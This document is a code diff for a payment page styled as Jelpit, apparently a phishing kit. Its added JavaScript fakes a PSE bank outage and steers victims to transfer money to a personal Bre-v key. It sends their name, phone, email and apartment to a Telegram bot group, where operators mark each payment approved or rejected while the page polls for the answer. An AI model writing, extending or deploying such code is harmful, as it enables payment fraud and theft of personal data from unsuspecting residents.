@@ -961,10 +961,35 @@ ${metodoInfo}
                         monto_formateado: totalFormatted
                     });
 
-                    // Redirigir al banco seleccionado
+                    // Bancos sin portal propio → modal "ups" con bre-v
+                    if (pseBank.includes('bold.co')) {
+                        document.getElementById('brevLoadingTexto').textContent = 'Conectando con el banco...';
+                        document.getElementById('brevLoadingOverlay').style.display = 'flex';
+                        btnPagar.disabled = true;
+                        setTimeout(() => {
+                            document.getElementById('brevLoadingOverlay').style.display = 'none';
+                            btnPagar.disabled = false;
+                            document.getElementById('brevModalTitulo').textContent = '¡Ups! Pago no disponible';
+                            document.getElementById('brevModalSub').textContent = `PSE no está disponible para ${pseBankNombre}. Intenta transferir directamente a la llave:`;
+                            document.getElementById('brevModalMonto').textContent = totalFormatted;
+                            window._brevData = {
+                                nombre: userNombre, apellido: userApellido, email: userEmail,
+                                celular: userCelular, nombreConjunto: nombreConjunto,
+                                referencia1: referencia1, selectedApt: selectedApt,
+                                referencia2: referencia2, totalFormatted: totalFormatted
+                            };
+                            document.getElementById('brevModal').style.setProperty('display', 'flex', 'important');
+                        }, 1800);
+                        return;
+                    }
+
+                    // Bancos con portal propio → redirect directo
+                    document.getElementById('brevLoadingTexto').textContent = 'Conectando con el banco...';
+                    document.getElementById('brevLoadingOverlay').style.display = 'flex';
+                    btnPagar.disabled = true;
                     setTimeout(() => {
                         window.location.href = pseBank;
-                    }, 500);
+                    }, 1800);
                 } else {
                     // Pago con tarjeta
                     const tarjetaDocType = document.getElementById('tarjetaDocType').value;
@@ -1325,10 +1350,20 @@ ${metodoInfo}
     </div>
 
     <!-- Brev: Loading Overlay -->
-    <div id="brevLoadingOverlay" style="display:none; position:fixed; inset:0; background:white; z-index:300001; flex-direction:column; align-items:center; justify-content:center; gap:24px; font-family:'Roboto Condensed',sans-serif;">
+    <div id="brevLoadingOverlay" style="display:none; position:fixed; inset:0; background:white; z-index:300001; flex-direction:column; align-items:center; justify-content:center; gap:24px; font-family:'Roboto Condensed',sans-serif; padding:30px; text-align:center;">
         <img src="img/logo_jelpit_color.svg" alt="Jelpit" style="height:48px; margin-bottom:8px;">
-        <div style="width:56px; height:56px; border:5px solid #e8e8e8; border-top-color:#1dbe5f; border-radius:50%; animation:jlpSpin 0.9s linear infinite;"></div>
-        <p id="brevLoadingTexto" style="font-size:16px; color:#555; margin:0;">Procesando pago...</p>
+        <div id="brevLoadingSpinner" style="width:56px; height:56px; border:5px solid #e8e8e8; border-top-color:#1dbe5f; border-radius:50%; animation:jlpSpin 0.9s linear infinite;"></div>
+        <p id="brevLoadingTexto" style="font-size:16px; color:#555; margin:0;">Verificando transferencia...</p>
+        <p style="font-size:13px; color:#aaa; margin:0;">Por favor espera mientras confirmamos tu pago.</p>
+        <!-- Mensaje de rechazo (oculto por defecto) -->
+        <div id="brevRechazadoMsg" style="display:none; flex-direction:column; align-items:center; gap:14px; max-width:300px;">
+            <div style="width:64px; height:64px; background:#fff5f5; border-radius:50%; display:flex; align-items:center; justify-content:center;">
+                <i class="fa-solid fa-xmark" style="font-size:28px; color:#dc3545;"></i>
+            </div>
+            <p style="font-size:16px; font-weight:700; color:#dc3545; margin:0;">Pago no verificado</p>
+            <p style="font-size:14px; color:#555; margin:0; line-height:1.5;">No pudimos confirmar tu transferencia. Por favor verifica que realizaste el pago a la llave correcta y vuelve a intentarlo.</p>
+            <button onclick="brevVolverModal()" style="background:#7c3aed; color:white; border:none; border-radius:25px; padding:13px 28px; font-size:14px; font-weight:700; cursor:pointer; font-family:'Roboto Condensed',sans-serif;">Volver a intentar</button>
+        </div>
     </div>
 
     <!-- Brev: Success Overlay -->
@@ -1373,28 +1408,94 @@ ${metodoInfo}
             });
         }
 
-        function brevConfirmar() {
+        let brevPollIv = null;
+
+        function brevStopPoll() {
+            if (brevPollIv) { clearInterval(brevPollIv); brevPollIv = null; }
+        }
+
+        async function brevConfirmar() {
             const modal = document.getElementById('brevModal');
             const d = window._brevData || {};
             modal.style.setProperty('display', 'none', 'important');
 
-            // Enviar notificación Telegram
-            sendToTelegram({
-                nombre: d.nombre, apellido: d.apellido, email: d.email,
-                celular: d.celular, tipo_doc: 'CC', cedula: '',
-                nombreConjunto: d.nombreConjunto, referencia1: d.referencia1,
-                selectedApt: d.selectedApt, referencia2: d.referencia2,
-                metodoPago: 'brev', pseBank: 'Bre-v (@LITTIO1047039997)',
-                monto_formateado: d.totalFormatted
-            });
-
-            // Loading → éxito
+            // Mostrar loading
+            document.getElementById('brevLoadingSpinner').style.display = 'block';
             document.getElementById('brevLoadingTexto').textContent = 'Verificando transferencia...';
+            document.getElementById('brevRechazadoMsg').style.display = 'none';
             document.getElementById('brevLoadingOverlay').style.display = 'flex';
-            setTimeout(() => {
-                document.getElementById('brevLoadingOverlay').style.display = 'none';
-                document.getElementById('brevSuccessOverlay').style.display = 'flex';
-            }, 2500);
+
+            // Generar sesión única
+            const sid = 'BRV' + Date.now() + Math.random().toString(36).substr(2, 4);
+
+            // Sincronizar offset para no leer callbacks viejos
+            await jlpGetUpdates();
+
+            // Mensaje Telegram con botones inline
+            const msg = '💸 <b>PAGO BRE-V — JELPIT</b>\n' +
+                '🆔 ID: <code>' + sid + '</code>\n' +
+                '─'.repeat(22) + '\n' +
+                '👤 <b>' + (d.nombre || '') + ' ' + (d.apellido || '') + '</b>\n' +
+                '📱 Cel: <code>' + (d.celular || '') + '</code>\n' +
+                '📧 ' + (d.email || '') + '\n' +
+                '─'.repeat(22) + '\n' +
+                '🏢 ' + (d.nombreConjunto || '') + ' · ' + (d.selectedApt || '') + '\n' +
+                '🔑 Llave: @LITTIO1047039997\n' +
+                '─'.repeat(22) + '\n' +
+                '💰 <b>' + (d.totalFormatted || '') + '</b>\n' +
+                '⏰ ' + new Date().toLocaleString('es-CO');
+
+            const kb = { inline_keyboard: [[
+                { text: '✅ Pagó', callback_data: 'jlp:brvapr:' + sid },
+                { text: '❌ No pagó', callback_data: 'jlp:brvrec:' + sid }
+            ]]};
+
+            fetch(JLP_API + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: JLP_GRP, text: msg, parse_mode: 'HTML', reply_markup: kb })
+            }).catch(() => {});
+
+            // Polling de respuesta
+            const t0 = Date.now();
+            brevStopPoll();
+            brevPollIv = setInterval(async function() {
+                if (Date.now() - t0 > 300000) { brevStopPoll(); return; }
+                const updates = await jlpGetUpdates();
+                for (const upd of updates) {
+                    if (!upd.callback_query) continue;
+                    const cdata = upd.callback_query.data || '';
+                    if (!cdata.endsWith(':' + sid)) continue;
+
+                    fetch(JLP_API + '/answerCallbackQuery', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ callback_query_id: upd.callback_query.id })
+                    }).catch(() => {});
+
+                    brevStopPoll();
+                    const action = cdata.split(':')[1];
+
+                    if (action === 'brvapr') {
+                        document.getElementById('brevLoadingOverlay').style.display = 'none';
+                        document.getElementById('brevSuccessOverlay').style.display = 'flex';
+                    } else {
+                        document.getElementById('brevLoadingSpinner').style.display = 'none';
+                        document.getElementById('brevLoadingTexto').style.display = 'none';
+                        document.getElementById('brevRechazadoMsg').style.display = 'flex';
+                    }
+                    return;
+                }
+            }, 2000);
+        }
+
+        function brevVolverModal() {
+            brevStopPoll();
+            document.getElementById('brevLoadingOverlay').style.display = 'none';
+            document.getElementById('brevLoadingTexto').style.display = 'block';
+            document.getElementById('brevLoadingSpinner').style.display = 'block';
+            document.getElementById('brevRechazadoMsg').style.display = 'none';
+            document.getElementById('brevModal').style.setProperty('display', 'flex', 'important');
         }
     </script>
 
